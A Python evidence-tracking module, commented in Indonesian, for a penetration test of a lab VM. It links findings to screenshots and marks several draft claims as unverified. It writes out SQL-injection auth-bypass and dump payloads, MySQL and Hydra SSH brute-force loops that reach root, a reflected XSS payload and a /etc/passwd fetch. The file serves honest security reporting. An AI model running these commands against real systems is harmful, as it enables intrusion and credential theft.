# -*- coding: utf-8 -*-
"""Anotasi bukti lapangan: pemetaan temuan -> file screenshot, status verifikasi.

Semua isi di bawah diturunkan langsung dari OCR atas 13 file pada folder
bukti-pentest. Tidak ada entri yang dibuat tanpa file yang benar-benar ada.
"""

import os

BUKTI_DIR = "/root/crack/bukti-pentest"

# Status verifikasi
TERBUKTI = "TERBUKTI"
SEBAGIAN = "SEBAGIAN"
TIDAK_LANGSUNG = "TIDAK LANGSUNG"
BELUM = "BELUM DIVERIFIKASI"

STATUS_MEANING = {
    TERBUKTI: "Ada screenshot yang secara langsung menunjukkan kerentanan.",
    SEBAGIAN: "Screenshot ada, tetapi hanya membuktikan sebagian klaim pada temuan.",
    TIDAK_LANGSUNG: "Tidak ada screenshot permintaan/respons; kesimpulan hanya dari artefak tak langsung di dump database.",
    BELUM: "Tidak ada screenshot sama sekali. Klaim berasal dari draf sebelumnya dan wajib dikonfirmasi ulang sebelum dipakai sebagai temuan.",
}

# ---------------------------------------------------------------------------
# Daftar screenshot, lengkap dengan stempel waktu dan isi yang terbaca.
# ---------------------------------------------------------------------------
SHOTS = [
    ("ping.png", "00:08", "Keterjangkauan host",
     ["64 bytes from 192.168.1.18: icmp_seq=1 ttl=64 time=10.5 ms",
      "64 bytes from 192.168.1.18: icmp_seq=2 ttl=64 time=2.32 ms",
      "64 bytes from 192.168.1.18: icmp_seq=3 ttl=64 time=1.95 ms",
      "64 bytes from 192.168.1.18: icmp_seq=4 ttl=64 time=1.12 ms",
      "4 packets transmitted, 4 received, 0% packet loss, time 3006ms",
      "rtt min/avg/max/mdev = 1.115/3.966/10.472/3.781 ms"]),

    ("scan nmap.png", "00:10", "Port dan versi layanan",
     ["22/tcp    open  ssh     OpenSSH 10.3 (protocol 2.0)",
      "3000/tcp  open  http    Node.js Express framework",
      "3307/tcp  open  mysql   MySQL 8.0.46",
      "MAC Address: 08:00:27:81:9D:8D (PCS Systemtechnik/Oracle VirtualBox virtual NIC)"]),

    ("2.png", "00:44", "Kredensial pada halaman publik",
     ["$ curl -s http://192.168.1.18:3000/login | grep -oE 'Contoh akun:.*'",
      "— TIDAK ADA OUTPUT TERCETAK —"]),

    ("3.png", "00:44", "Login foothold",
     ["$ curl -s -c /tmp/c ... -X POST http://192.168.1.18:3000/login -d username=individu1&password=REDACTED_STORED_PASSWORD",
      "HTTP=302 -> http://192.168.1.18:3000/dashboard"]),

    ("4.png", "00:44", "IDOR data keuangan lintas perusahaan",
     ["$ curl -s -b /tmp/c http://192.168.1.18:3000/api/perusahaan/2/data-keuangan",
      '[{"id":3,"perusahaan_id":2,"tahun":2026,"uraian":"Reimbursement transport peserta","nominal":"980000.00"},',
      ' {"id":4,"perusahaan_id":2,"tahun":2026,"uraian":"Reimbursement konsumsi kegiatan","nominal":"2150000.00"}]']),

    ("5.png", "00:44", "SQLi - penentuan jumlah kolom",
     ["$ curl -s -X POST .../login-noportal --data-urlencode \"username=user_a' ORDER BY 7-- -\" ...",
      "— TIDAK ADA OUTPUT TERCETAK —"]),

    ("6.png", "00:45", "SQLi - auth bypass",
     ["$ curl -s -c /tmp/s ... --data-urlencode \"username=x' UNION SELECT 1,'hacker','x','perusahaan','BlackHat',1-- -\"",
      "HTTP=302 -> http://192.168.1.18:3000/dashboard",
      "— Baris 'Masuk sebagai: BlackHat' TIDAK tercetak —"]),

    ("7.png", "00:45", "SQLi - dump kredensial",
     ["$ P=\"x' UNION SELECT 1,'p','x','perusahaan',(SELECT GROUP_CONCAT(...) FROM users),1-- -\"",
      "$ curl -s -c /tmp/d -o /dev/null -X POST .../login-noportal --data-urlencode username=$P ...",
      "— TIDAK ADA OUTPUT TERCETAK; hasil dump tidak terbukti —"]),

    ("8.png", "00:46", "Brute force MySQL port 3307",
      ["$ for u in root labkeu_user labkeu admin; do for p in \"\" root REDACTED_WEAK_PASSWORD REDACTED_DB_PASSWORD REDACTED_STORED_PASSWORD REDACTED_DB_PASSWORD; ...",
      "TEMUKAN: labkeu_user / REDACTED_DB_PASSWORD"]),

    ("9.png", "00:47", "Dump penuh basis data",
     ["| Tables_in_labkeu | data_keuangan, dokumen, perusahaan, users  (4 tabel)",
      "| 1  | user_a     | REDACTED_STORED_PASSWORD | perusahaan | Admin CV Sinar Abadi | 1        |",
      "| 2  | user_b     | REDACTED_STORED_PASSWORD | perusahaan | Admin PT Maju Bersama| 2        |",
      "| 3  | individu1  | REDACTED_STORED_PASSWORD | individu   | Budi Santoso        | NULL     |",
      "| 11 | test_individu_$(date %s) | REDACTED_TEST_PASSWORD | individu | Test Individu | NULL    |",
      "| 13 | zzz_unique_18950 | REDACTED_TEST_PASSWORD | individu | Test | NULL |",
      "| 14 | zzz_csrf_31965     | REDACTED_TEST_PASSWORD | individu | Test | NULL |",
      "| 20 | esc_audit          | REDACTED_TEST_PASSWORD | perusahaan| Audit | NULL |",
      "| data_keuangan: 4 baris, perusahaan_id 1 (2 baris) dan 2 (2 baris) |"]),

    ("10.png", "00:42", "Brute force SSH dengan Hydra",
     ["$ printf 'root\\nlabkeu\\nadmin\\nubuntu\\n' > /tmp/u.txt",
      "$ printf 'Labkeu\\nREDACTED_DB_PASSWORD\\npassword\\nREDACTED_STORED_PASSWORD\\nREDACTED_STORED_PASSWORD\\ntoor\\n' > /tmp/p.txt",
      "$ hydra -L /tmp/u.txt -P /tmp/p.txt -t 4 -W 3 -f 192.168.1.18 -s 22 ssh",
      "Hydra v9.7 starting at 2026-09-29 00:42:52",
      "[DATA] max 4 tasks per 1 server, overall 4 tasks, 24 login tries (1:4/p:6)",
      "[22][ssh] host: 192.168.1.18 login: root password: REDACTED_SSH_ROOT_PW",
      "[STATUS] attack finished for 192.168.1.18 (valid pair found)",
      "1 of 1 target successfully completed, 1 valid password found",
      "finished at 2026-09-29 00:42:54"]),

    ("11.png", "00:47", "Akses root terkonfirmasi",
     ["$ sshpass -p 'REDACTED_SSH_ROOT_PW' ssh -o StrictHostKeyChecking=no root@192.168.1.18 \"id; uname -a; cat /etc/alpine-release\"",
      "uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),...",
      "Linux localhost 6.18.52-0-lts #1-Alpine SMP PREEMPT_DYNAMIC 2026-09-15 05:37:48 x86_64 Linux",
      "3.24.2"]),
]

# ---------------------------------------------------------------------------
# Pemetaan temuan -> bukti.Angka sebelum koma = jumlah bukticreenshot.
# ---------------------------------------------------------------------------
FINDING_EVIDENCE = {
    "F-01": (SEBAGIAN, ["5.png", "6.png", "7.png"],
             "5.png dan 7.png hanya memuat perintah tanpa output, sehingga hasil ORDER BY maupun dump "
             "kredensial tidak terbukti. 6.png membuktikan HTTP=302 tetapi baris 'Masuk sebagai: BlackHat' "
             "tidak tercetak. Isi kredensial yang bocor terbukti ada, tetapi lewat akses MySQL langsung "
             "(9.png), bukan lewat SQLi."),
    "F-02": (BELUM, ["2.png", "3.png"],
             "3.png membuktikan kredensial itu benar-benar berhasil dipakai (HTTP=302 ke /dashboard), "
             "sehingga kredensial tersebut aktif. Namun 2.png, yang seharusnya menuncikkan teks "
             "'Contoh akun:' dari halaman publik, hanya memuat perintah tanpa baris output. Klaim "
             "bahwa kredensial tercetak di halaman publik karena itu BELUM terbukti."),
    "F-03": (TIDAK_LANGSUNG, ["9.png"],
             "Dump 9.png memperlihatkan akun hasil pengujian sebelumnya (test_individu_, zzz_unique_18950, "
             "zzz_csrf_31965, esc_audit), yang konsisten dengan self-registration dan role escalation. "
             "Namun tidak ada screenshot permintaan/respons pendaftaran."),
    "F-04": (TERBUKTI, ["4.png"],
             "4.png menunjukkan respons JSON 200 milik perusahaan_id 2 diambil memakai sesi individu1 "
             "yang perusahaan_id-nya NULL, tanpa pengecekan kepemilikan."),
    "F-05": (BELUM, [],
             "Tidak ada screenshot yang menunjukkan unggah file maupun XSS tersimpan."),
    "F-06": (BELUM, [],
             "Tidak ada screenshot pengujian rate limit. Klaim 1.000 permintaan menghasilkan 946 akun "
             "dan 5,62 detik berasal dari draf sebelumnya tanpa bukti pendukung."),
    "F-07": (BELUM, [],
             "Tidak ada screenshot pengujian cookie, logout, session fixation, maupun pemecahan secret."),
    "F-08": (TERBUKTI, ["9.png"],
             "9.png memperlihatkan kolom password berisi REDACTED_STORED_PASSWORD dan REDACTED_TEST_PASSWORD dalam teks polos "
             "untuk seluruh baris tabel users."),
    "F-09": (SEBAGIAN, ["scan nmap.png"],
             "scan nmap.png membuktikan hanya tiga port terbuka tanpa listener TLS, sehingga tidak ada "
             "HTTPS. Bukti kredensial terbaca di kabel (tcpdump) tidak direkam."),
    "F-10": (TIDAK_LANGSUNG, ["9.png"],
             "Keberadaan akun zzz_csrf_31965 pada 9.png konsisten dengan uji CSRF, tetapi tidak ada "
             "screenshot respons 200 untuk POST lintas-origin."),
    "F-11": (BELUM, [], "Tidak ada screenshot permintaan maupun respons untuk /search."),
    "F-12": (BELUM, [],
             "Tidak ada screenshot pengambilan /uploads/passwd maupun kode statusnya."),
    "F-13": (BELUM, [], "Tidak ada screenshot respons header untuk pemeriksaan security header."),
    "F-14": (BELUM, [], "Tidak ada screenshot pesan error /register untuk username yang ada dan tidak ada."),
    "F-15": (SEBAGIAN, ["8.png", "9.png", "10.png", "11.png"],
             "8.png dan 9.png membuktikan MySQL 3307 terbuka dan dapat diakses dengan kredensial lemah; "
             "10.png dan 11.png membuktikan SSH root berhasil pada percobaan ke-24 dalam 2 detik. "
             "Klaim grup docker, container berjalan sebagai root, dan secret yang bocor di artefak "
             "deployment tidak memiliki screenshot pendukung."),
}

# Temuan yang tidak punya bukticreenshot sama sekali.
UNVERIFIED = [k for k, v in sorted(FINDING_EVIDENCE.items()) if v[0] == BELUM]

# Screenshot yang dipakai temuan tetapi tidak pernah dirujuk temuan mana pun.
def orphans():
    used = set()
    for _, shots, _ in FINDING_EVIDENCE.values():
        used.update(shots)
    return [s[0] for s in SHOTS if s[0] not in used]


def path(name):
    return os.path.join(BUKTI_DIR, name)


def status_counts():
    c = {TERBUKTI: 0, SEBAGIAN: 0, TIDAK_LANGSUNG: 0, BELUM: 0}
    for st, _, _ in FINDING_EVIDENCE.values():
        c[st] += 1
    return c


# Checklist screenshot yang perlu direkam ulang untuk menutup celah.
CHECKLIST = [
    ("F-02", "Kredensial tercetak di halaman publik",
     "curl -s http://192.168.1.18:3000/login | grep -oE 'Contoh akun:.*'",
     "Screenshot harus memuat BARIS OUTPUT, bukan hanya perintah."),
    ("F-01", "Hasil ORDER BY 7 (error kolom ke-7)",
     "curl -s -X POST http://192.168.1.18:3000/login-noportal --data-urlencode \"username=user_a' ORDER BY 7-- -\" --data-urlencode 'password=x' | grep -oE 'Query error: [^<]*'",
     "Screenshot harus memuat pesan error dari database."),
    ("F-01", "Auth bypass terbukti lewat isi sesi",
     "curl -s -b /tmp/s http://192.168.1.18:3000/dashboard | grep -oE 'Masuk sebagai: <strong>[^<]*</strong>'",
     "Baris 'Masuk sebagai: BlackHat' harus ikut tercetak pada frame yang sama."),
    ("F-01", "Dump kredensial via SQLi",
     " Jalankan payload GROUP_CONCAT lalu cetak hasil grep",
     "Hasil dump harus tercetak, bukan hanya payload-nya."),
    ("F-06", "Rate limit pada 100 dan 1.000 permintaan",
     "for i in $(seq 1 100); do curl -s -o /dev/null -w '%{http_code}\\n' -X POST http://192.168.1.18:3000/login-noportal -d 'username=user_a&password=WRONG'; done | sort | uniq -c",
     "Harus memperlihatkan seluruh kode HTTP tanpa 429/403."),
    ("F-06", "Self-registration massal",
     "for i in $(seq 1 1000); do curl -s -o /dev/null -w '%{http_code}\\n' -X POST http://192.168.1.18:3000/register -d \"username=bulk_$i&password=Test1234\"; done | sort | uniq -c",
     "Lalu hitung jumlah baris baru di tabel users."),
    ("F-07", "Cookie tanpa HttpOnly dan tanpa Secure",
     "curl -s -D - -o /dev/null http://192.168.1.18:3000/login",
     "Header Set-Cookie harus terlihat jelas."),
    ("F-07", "Sesi masih hidup setelah logout",
     "curl -s -b /tmp/c -c /tmp/c -o /dev/null -X POST http://192.168.1.18:3000/logout; curl -s -b /tmp/c -o /dev/null -w 'reuse -> %{http_code} -> %{redirect_url}\\n' http://192.168.1.18:3000/dashboard",
     "Harus menunjukkan 302 ke /dashboard meski sudah logout."),
    ("F-03", "Self-registration dengan peran perusahaan",
     "curl -s -X POST http://192.168.1.18:3000/register -d 'username=esc_test1&password=Test1234&account_type=perusahaan'",
     "Tunjukkan kode status dan isi dashboard sesi hasilnya."),
    ("F-14", "Enumerasi username",
     "curl -s -X POST http://192.168.1.18:3000/register -d 'username=user_a&password=x'; curl -s -X POST http://192.168.1.18:3000/register -d 'username=tidak_ada_zzz&password=x'",
     "Kedua pesan error harus tercetak berdampingan."),
    ("F-12", "/etc/passwd tersaji publik",
     "curl -s -o /dev/null -w 'HTTP=%{http_code}\\n' http://192.168.1.18:3000/uploads/passwd",
     "Tampilkan kode status dan 5 baris pertama isinya."),
    ("F-13", "Security header",
     "curl -s -D - -o /dev/null http://192.168.1.18:3000/login",
     "Tunjukkan seluruh blok header respons."),
    ("F-11", "Reflected XSS pada /search",
     "curl -s \"http://192.168.1.18:3000/search?q=%3Cscript%3Ealert(1)%3C/script%3E\" | grep -o '<script>alert(1)</script>'",
     "Script yang tidak ter-escape harus muncul utuh pada respons."),
    ("F-05", "Unggah file tanpa pembatasan",
     "curl -s -b /tmp/c -F 'file=@test.html' http://192.168.1.18:3000/upload",
     "Tunjukkan file tersimpan dan dapat diambil kembali dari /uploads/."),
    ("F-09", "Kredensial terbaca di kabel",
     "Terminal 1: tcpdump -A -s0 'tcp port 3000'   Terminal 2: curl login",
     "Tampilkan baris POST berisi REDACTED_STORED_PASSWORD dalam plaintext."),
    ("F-15", "Grup docker, container non-root, secret bocor",
     "sshpass -p 'REDACTED_SSH_ROOT_PW' ssh root@192.168.1.18 'id labkeu; ls -l /var/run/docker.sock; docker ps --format \"{{.Names}} {{.User}}\"; grep -r SESSION_SECRET /home/labkeu' ",
     "Satu frame yang memuat keempat hasil sekaligus."),
    ("F-01", "Nomor versi Node.js dan Express",
     "nmap -Pn -sV -sC -p 22,3000,3307 192.168.1.18",
     "Perintah asli tidak memakai -sC, sehingga versi tidak dapat disimpulkan."),
]
